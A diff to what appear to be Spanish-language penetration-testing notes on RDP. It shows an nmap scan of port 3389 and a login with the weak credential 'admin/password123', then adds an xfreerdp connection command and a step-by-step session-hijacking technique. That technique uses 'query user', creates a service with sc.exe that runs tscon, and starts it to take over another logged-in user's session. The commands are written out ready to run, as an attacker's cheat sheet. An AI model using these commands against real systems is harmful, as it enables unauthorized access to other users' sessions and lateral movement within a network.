@@ -6,3 +6,16 @@ nmap -Pn -p3389 192.168.2.143
 Conectarse:
 rdesktop -u admin -p password123 192.168.2.143
 
+REMOTE DESK CONECTION
+xfreerdp /u:(username) /p:(password) /v:(Machine IP) /dynamic-resolution
+
+#########Impersonar un usuario conectado por rdp:
+Necesitamos tener privilegios de administrador.
+primero vemos si hay otro usuario conectado:
+query user
+
+creamos un servicio:
+sc.exe create sessionhijack binpath= "cmd.exe /k tscon <user_id_a_impersonar> /dest:<nuestra_sesion>"
+
+luego iniciamos el servicio y se va a abrir un cmd con la sesión del usuario:
+net start sessionhijack
